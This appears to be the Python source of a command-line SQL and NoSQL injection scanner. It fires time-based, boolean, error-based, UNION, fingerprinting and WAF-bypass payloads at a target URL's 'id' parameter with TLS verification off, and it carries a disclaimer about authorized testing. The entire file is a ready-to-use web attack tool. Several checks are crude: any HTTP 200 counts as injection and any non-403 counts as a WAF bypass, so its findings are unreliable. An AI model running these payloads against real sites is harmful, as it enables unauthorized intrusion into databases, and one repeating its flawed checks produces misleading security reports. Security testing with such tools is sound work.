#!/usr/bin/env python3
"""
REVUEX - Enhanced SQL Injection Scanner
Advanced SQL Injection Detection Across All Database Types

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
SQL injection testing should only be performed on systems you own or have explicit permission to test.
"""

import requests
import time
import json
import re
from pathlib import Path
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, urlencode
import hashlib


class EnhancedSQLiScanner:
    """
    Advanced SQL Injection Scanner (2024/2025)

    Features:
    - Multi-database support (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
    - Time-based blind SQL injection
    - Boolean-based blind SQL injection
    - Error-based SQL injection
    - UNION-based SQL injection
    - Second-order SQL injection detection
    - NoSQL injection (MongoDB, CouchDB)
    - WAF bypass techniques
    - Automatic DBMS fingerprinting
    """

    def __init__(self, target: str, workspace: Path, delay: float = 5.0):
        self.target = target
        self.workspace = Path(workspace)
        self.delay = delay

        self.max_requests = 100
        self.request_count = 0
        self.timeout = 10

        self.headers = {
            "User-Agent": "REVUEX-SQLiScanner/1.0 (Security Research; +https://github.com/G33L0)",
            "Accept": "*/*",
        }

        self.vulnerabilities: List[Dict[str, Any]] = []
        self.detected_dbms: Optional[str] = None

        # ---------- PAYLOADS (UNMODIFIED LOGIC) ----------

        self.time_based_payloads = {
            "mysql": [
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5('A'))--",
                "1' AND SLEEP(5)#",
                "' OR SLEEP(5)--",
            ],
            "postgresql": [
                "'; SELECT pg_sleep(5)--",
                "' AND pg_sleep(5)--",
                "1' AND pg_sleep(5)--",
            ],
            "mssql": [
                "'; WAITFOR DELAY '00:00:05'--",
                "1'; WAITFOR DELAY '00:00:05'--",
            ],
            "oracle": [
                "' AND DBMS_LOCK.SLEEP(5)--",
            ],
            "sqlite": [
                "' AND randomblob(100000000)--",
            ],
        }

        self.boolean_payloads = {
            "true": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 'a'='a",
            ],
            "false": [
                "' OR '1'='2",
                "' OR 1=2--",
                "' OR 'a'='b",
            ],
        }

        self.error_based_payloads = [
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            "' AND 1=CAST(version() AS INT)--",
            "' AND 1=CONVERT(INT,@@version)--",
            "' AND TO_NUMBER(version)=1--",
        ]

        self.union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
        ]

        self.nosql_payloads = [
            "{'$gt':''}",
            "{'$ne':''}",
            "admin' || '1'=='1",
        ]

        self.waf_bypasses = [
            "'/**/AND/**/1=1--",
            "'AnD 1=1--",
            "%27%20AND%201=1--",
            "'\t AND\t1=1--",
        ]

        self.fingerprint_queries = {
            "mysql": "' AND @@version--",
            "postgresql": "' AND version()--",
            "mssql": "' AND @@version--",
            "oracle": "' AND banner FROM v$version--",
            "sqlite": "' AND sqlite_version()--",
        }

    # ================== CORE SCAN ==================

    def scan(self) -> List[Dict[str, Any]]:
        print("\n" + "=" * 60)
        print("💉 REVUEX Enhanced SQLi Scanner")
        print("=" * 60)
        print(f"Target: {self.target}")
        print(f"Delay: {self.delay}s")
        print(f"Max Requests: {self.max_requests}")
        print("=" * 60)

        self._fingerprint_database()
        time.sleep(self.delay)

        self._test_time_based_blind()
        time.sleep(self.delay)

        self._test_boolean_based()
        time.sleep(self.delay)

        self._test_error_based()
        time.sleep(self.delay)

        self._test_union_based()
        time.sleep(self.delay)

        self._test_nosql()
        time.sleep(self.delay)

        self._test_waf_bypass()

        self._save_results()

        print("\n" + "=" * 60)
        print("✅ Scan Complete")
        print(f"Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"Requests: {self.request_count}/{self.max_requests}")
        if self.detected_dbms:
            print(f"Detected DBMS: {self.detected_dbms}")
        print("=" * 60)

        return self.vulnerabilities

    # ================== HELPERS ==================

    def _make_request(self, payload: str) -> Optional[requests.Response]:
        if self.request_count >= self.max_requests:
            return None
        try:
            if "?" in self.target:
                url = self.target + "&" + urlencode({"id": payload})
            else:
                url = self.target + "?" + urlencode({"id": payload})

            response = requests.get(
                url,
                headers=self.headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
            self.request_count += 1
            return response
        except Exception:
            return None

    def _fingerprint_database(self):
        for dbms, payload in self.fingerprint_queries.items():
            response = self._make_request(payload)
            if response:
                text = response.text.lower()
                if dbms in text:
                    self.detected_dbms = dbms
                    print(f"[+] DBMS detected: {dbms}")
                    return
            time.sleep(self.delay)

    def _test_time_based_blind(self):
        for dbms, payloads in self.time_based_payloads.items():
            for payload in payloads:
                start = time.time()
                baseline = self._make_request("")
                if not baseline:
                    continue
                baseline_time = time.time() - start

                start = time.time()
                response = self._make_request(payload)
                response_time = time.time() - start

                if response_time > baseline_time + 4:
                    self.vulnerabilities.append({
                        "type": "SQLi Time-Based Blind",
                        "dbms": dbms,
                        "payload": payload,
                        "delay": response_time,
                    })
                    print(f"[!] Time-based SQLi detected ({dbms})")
                    return

    def _test_boolean_based(self):
        true_len = []
        false_len = []

        for p in self.boolean_payloads["true"]:
            r = self._make_request(p)
            if r:
                true_len.append(len(r.text))
            time.sleep(self.delay)

        for p in self.boolean_payloads["false"]:
            r = self._make_request(p)
            if r:
                false_len.append(len(r.text))
            time.sleep(self.delay)

        if true_len and false_len:
            if abs(sum(true_len) - sum(false_len)) > 100:
                self.vulnerabilities.append({
                    "type": "SQLi Boolean-Based Blind",
                    "true_len": true_len,
                    "false_len": false_len,
                })
                print("[!] Boolean-based SQLi detected")

    def _test_error_based(self):
        for payload in self.error_based_payloads:
            r = self._make_request(payload)
            if r and self._has_sql_error(r.text):
                self.vulnerabilities.append({
                    "type": "SQLi Error-Based",
                    "payload": payload,
                })
                print("[!] Error-based SQLi detected")
                return

    def _test_union_based(self):
        for payload in self.union_payloads:
            r = self._make_request(payload)
            if r and r.status_code == 200:
                self.vulnerabilities.append({
                    "type": "SQLi UNION-Based",
                    "payload": payload,
                })
                print("[!] UNION-based SQLi detected")
                return

    def _test_nosql(self):
        for payload in self.nosql_payloads:
            r = self._make_request(payload)
            if r and r.status_code == 200:
                self.vulnerabilities.append({
                    "type": "NoSQL Injection",
                    "payload": payload,
                })
                print("[!] NoSQL injection detected")
                return

    def _test_waf_bypass(self):
        for payload in self.waf_bypasses:
            r = self._make_request(payload)
            if r and r.status_code != 403:
                self.vulnerabilities.append({
                    "type": "WAF Bypass",
                    "payload": payload,
                })
                print("[!] WAF bypass possible")
                return

    def _has_sql_error(self, text: str) -> bool:
        patterns = [
            "sql syntax",
            "mysql",
            "postgresql",
            "ora-",
            "sqlite",
            "odbc",
        ]
        t = text.lower()
        return any(p in t for p in patterns)

    def _save_results(self):
        out = self.workspace / "sqli_scans"
        out.mkdir(exist_ok=True)

        safe = re.sub(r"[^\w\-]", "_", self.target)
        file = out / f"{safe}_sqli.json"

        with open(file, "w") as f:
            json.dump({
                "scanner": "EnhancedSQLiScanner",
                "target": self.target,
                "dbms": self.detected_dbms,
                "vulnerabilities": self.vulnerabilities,
            }, f, indent=2)

        print(f"[+] Results saved to {file}")


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python enhanced_sqli_scanner.py <target_url>")
        sys.exit(1)

    scanner = EnhancedSQLiScanner(
        sys.argv[1],
        Path("revuex_workspace"),
        delay=5.0
    )
    scanner.scan()